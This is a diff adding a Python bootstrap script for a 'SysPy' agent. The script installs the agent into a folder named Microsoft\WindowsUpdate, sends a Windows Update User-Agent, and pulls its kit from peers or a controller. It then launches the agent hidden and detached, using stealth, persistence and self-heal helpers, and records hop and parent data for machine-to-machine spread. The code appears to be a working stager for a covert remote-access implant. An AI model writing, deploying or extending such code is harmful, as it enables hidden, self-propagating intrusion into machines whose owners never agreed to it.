@@ -1,0 +1,359 @@
+#!/usr/bin/env python3
+"""SysPy bootstrap - stage the agent from a kit, a peer, or a URL.
+
+    python bootstrap.py --install --from-peer http://10.0.0.5:8789
+    python bootstrap.py --install --kit C:\\temp\\kit
+    python bootstrap.py --uninstall
+
+Also exposes ``agent_alive()`` and ``start_agent()``; ``syspy.agent.bootstrap_bridge``
+imports those for the guardian self-heal routine.
+
+Stdlib only. Runs on a machine with any Python 3.
+"""
+
+from __future__ import annotations
+
+import argparse
+import io
+import json
+import os
+import shutil
+import subprocess
+import sys
+import tempfile
+import time
+import urllib.request
+import zipfile
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+DEFAULT_TARGET = os.path.join(
+    os.environ.get("LOCALAPPDATA") or os.path.expanduser("~"),
+    "Microsoft", "WindowsUpdate")
+IS_WINDOWS = os.name == "nt"
+CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0
+USER_AGENT = "WindowsUpdateService/1.0"
+
+#: Files the kit owns.  Anything else in the target dir (kit.zip, wu.cmd,
+#: runtime/) is preserved across a refresh.
+OWNED = ("syspy", "install", "agent.py", "bootstrap.py")
+
+
+# --------------------------------------------------------------------------- syspy
+def _import_syspy(root: str) -> None:
+    """Make ``syspy`` importable from ``root`` without a restart."""
+    if root in sys.path:
+        sys.path.remove(root)
+    sys.path.insert(0, root)
+
+
+_import_syspy(HERE)
+
+
+def _stealth():
+    from syspy.agent import stealth
+    return stealth
+
+
+def _config():
+    from syspy import config
+    return config
+
+
+# --------------------------------------------------------------------------- net
+def fetch(url: str, timeout: float = 120.0) -> bytes:
+    request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
+    with urllib.request.urlopen(request, timeout=timeout) as response:
+        return response.read()
+
+
+def fetch_to(url: str, path: str, timeout: float = 300.0) -> int:
+    data = fetch(url, timeout)
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "wb") as handle:
+        handle.write(data)
+    return len(data)
+
+
+# --------------------------------------------------------------------------- stage
+def clean_owned(target: str) -> None:
+    for name in OWNED:
+        path = os.path.join(target, name)
+        if os.path.isdir(path):
+            shutil.rmtree(path, ignore_errors=True)
+        elif os.path.exists(path):
+            try:
+                os.remove(path)
+            except OSError:
+                pass
+
+
+def extract(blob: bytes, target: str) -> None:
+    """Extract a kit zip over ``target``."""
+    os.makedirs(target, exist_ok=True)
+    with zipfile.ZipFile(io.BytesIO(blob)) as archive:
+        archive.extractall(target)
+
+
+def write_deploy(target: str, data: dict) -> str:
+    path = os.path.join(target, "deploy.json")
+    with open(path, "w", encoding="utf-8") as handle:
+        json.dump(data, handle, indent=1)
+    return path
+
+
+def cache_kit(target: str, blob: bytes) -> str:
+    path = os.path.join(target, "kit.zip")
+    with open(path, "wb") as handle:
+        handle.write(blob)
+    return path
+
+
+# --------------------------------------------------------------------------- python
+def _console_variant(path: str) -> str:
+    if IS_WINDOWS and path.lower().endswith("pythonw.exe"):
+        candidate = path[: -len("pythonw.exe")] + "python.exe"
+        if os.path.exists(candidate):
+            return candidate
+    return path
+
+
+def find_python(target: str) -> list[list[str]]:
+    """Ordered launch commands, best first.  Empty when nothing usable."""
+    found: list[list[str]] = []
+
+    local = os.path.join(target, "runtime")
+    for name in ("pythonw.exe", "python.exe", "python3", "python"):
+        candidate = os.path.join(local, name)
+        if os.path.exists(candidate):
+            found.append([candidate])
+
+    if IS_WINDOWS:
+        for name, pre in (("pyw.exe", ["-3"]), ("pythonw.exe", []),
+                          ("py.exe", ["-3"]), ("python.exe", [])):
+            resolved = shutil.which(name)
+            if resolved and [resolved] + pre not in found:
+                found.append([resolved] + pre)
+    else:
+        for name in ("python3", "python"):
+            resolved = shutil.which(name)
+            if resolved:
+                found.append([resolved])
+
+    return found
+
+
+def _usable(command: list[str]) -> bool:
+    """True when this interpreter really is Python 3 (dodges the Store stub)."""
+    try:
+        probe = [_console_variant(command[0])] + command[1:]
+        result = subprocess.run(
+            probe + ["-c", "import sys;print(sys.version_info[0])"],
+            capture_output=True, text=True, timeout=20,
+            creationflags=CREATE_NO_WINDOW, stdin=subprocess.DEVNULL)
+        return result.returncode == 0 and result.stdout.strip().startswith("3")
+    except Exception:
+        return False
+
+
+def ensure_runtime(target: str, base: str = "", quiet: bool = False) -> str:
+    """Fetch an embeddable interpreter when the box has none."""
+    for command in find_python(target):
+        if _usable(command):
+            return command[0]
+    if not base:
+        return ""
+
+    runtime = os.path.join(target, "runtime")
+    archive = os.path.join(tempfile.gettempdir(), "wu-py.zip")
+    _say(quiet, "  fetching a private Python")
+    try:
+        fetch_to(base.rstrip("/") + "/wu/py.zip", archive)
+        shutil.rmtree(runtime, ignore_errors=True)
+        os.makedirs(runtime, exist_ok=True)
+        with zipfile.ZipFile(archive) as bundle:
+            bundle.extractall(runtime)
+        enable_site(runtime)
+    except Exception as error:
+        _say(quiet, f"  runtime fetch failed: {error}")
+        return ""
+
+    for name in ("pythonw.exe", "python.exe", "python3", "python"):
+        candidate = os.path.join(runtime, name)
+        if os.path.exists(candidate):
+            return candidate
+    return ""
+
+
+def enable_site(runtime: str) -> None:
+    """An embeddable build ignores site-packages and the script dir until told.
+
+    Appending ``..`` puts the bundle root on ``sys.path`` so ``import syspy``
+    resolves from the agent next door.
+    """
+    try:
+        names = os.listdir(runtime)
+    except OSError:
+        return
+    for name in names:
+        if not name.endswith("._pth"):
+            continue
+        path = os.path.join(runtime, name)
+        try:
+            with open(path, "r", encoding="utf-8") as handle:
+                lines = handle.read().splitlines()
+        except OSError:
+            continue
+        cleaned, changed = [], False
+        for line in lines:
+            if line.replace(" ", "").strip() == "#importsite":
+                cleaned.append("import site")
+                changed = True
+            else:
+                cleaned.append(line)
+        for wanted in ("import site", ".."):
+            if wanted not in [entry.strip() for entry in cleaned]:
+                cleaned.append(wanted)
+                changed = True
+        if not changed:
+            continue
+        try:
+            with open(path, "w", encoding="utf-8") as handle:
+                handle.write("\n".join(cleaned) + "\n")
+        except OSError:
+            pass
+
+
+# --------------------------------------------------------------------------- run
+def agent_alive() -> bool:
+    """True when an agent already owns the single-instance lock."""
+    try:
+        stealth = _stealth()
+        pid = stealth.read_pid(stealth.lock_path())
+        return bool(pid) and stealth.process_alive(pid)
+    except Exception:
+        return False
+
+
+def start_agent(target: str, extra: list[str] | None = None) -> bool:
+    """Launch the agent detached and windowless."""
+    entry = os.path.join(target, "agent.py")
+    if not os.path.isfile(entry):
+        return False
+
+    commands = find_python(target)
+    if not commands:
+        return False
+    command = list(commands[0]) + [entry, "--hidden"] + list(extra or [])
+
+    kwargs: dict = {"close_fds": True, "cwd": target}
+    if IS_WINDOWS:
+        kwargs["creationflags"] = 0x00000008 | 0x00000200  # DETACHED | NEW_GROUP
+    try:
+        subprocess.Popen(command, **kwargs)
+        return True
+    except OSError:
+        return False
+
+
+def _say(quiet: bool, message: str) -> None:
+    if not quiet:
+        print(message)
+
+
+# --------------------------------------------------------------------------- main
+def parse_args(argv: list[str]) -> argparse.Namespace:
+    parser = argparse.ArgumentParser(description="SysPy bootstrap")
+    parser.add_argument("--install", action="store_true")
+    parser.add_argument("--uninstall", action="store_true")
+    parser.add_argument("--from-peer", default="", help="http://ip:port serving /kit")
+    parser.add_argument("--kit", default="", help="local directory holding kit.zip")
+    parser.add_argument("--base", default="", help="controller base url (for py.zip)")
+    parser.add_argument("--target", default=DEFAULT_TARGET)
+    parser.add_argument("--parent", default="")
+    parser.add_argument("--parent-ip", default="")
+    parser.add_argument("--hop", type=int, default=0)
+    parser.add_argument("--group", default="")
+    parser.add_argument("--no-start", action="store_true")
+    parser.add_argument("--quiet", action="store_true")
+    return parser.parse_args(argv)
+
+
+def install(args: argparse.Namespace) -> int:
+    target = os.path.abspath(args.target)
+    os.makedirs(target, exist_ok=True)
+
+    blob = b""
+    if args.kit:
+        candidate = os.path.join(args.kit, "kit.zip")
+        if os.path.isfile(candidate):
+            with open(candidate, "rb") as handle:
+                blob = handle.read()
+        else:
+            # Loose directory: zip it on the fly.
+            buffer = io.BytesIO()
+            with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
+                for name in OWNED:
+                    path = os.path.join(args.kit, name)
+                    if os.path.isfile(path):
+                        archive.write(path, name)
+                    elif os.path.isdir(path):
+                        for current, _dirs, files in os.walk(path):
+                            for filename in files:
+                                full = os.path.join(current, filename)
+                                archive.write(full, os.path.relpath(full, args.kit))
+            blob = buffer.getvalue()
+    elif args.from_peer:
+        url = args.from_peer.rstrip("/")
+        _say(args.quiet, f"  pulling kit from {url}")
+        blob = fetch(url + "/kit", timeout=180)
+
+    if not blob:
+        print("error: nothing to install (use --kit or --from-peer)")
+        return 1
+
+    clean_owned(target)
+    extract(blob, target)
+    cache_kit(target, blob)
+
+    from syspy import config
+    write_deploy(target, {
+        "url": args.base or config.PUBLIC_URL,
+        "room": config.ROOM,
+        "pass": config.PASSPHRASE,
+        "brokers": config.BROKERS,
+        "parent": args.parent,
+        "parent_ip": args.parent_ip,
+        "hop": int(args.hop),
+        "group": args.group,
+        "installed_at": int(time.time()),
+    })
+
+    if args.base:
+        ensure_runtime(target, args.base, args.quiet)
+
+    if not args.no_start:
+        start_agent(target)
+    _say(args.quiet, f"  installed to {target}")
+    return 0
+
+
+def uninstall(args: argparse.Namespace) -> int:
+    _import_syspy(os.path.abspath(args.target))
+    from syspy.agent import persistence
+    for action in persistence.remove():
+        print(f"  [x] {action}")
+    return 0
+
+
+def main(argv: list[str] | None = None) -> int:
+    args = parse_args(list(sys.argv[1:] if argv is None else argv))
+    if args.uninstall:
+        return uninstall(args)
+    if args.install:
+        return install(args)
+    print(__doc__)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
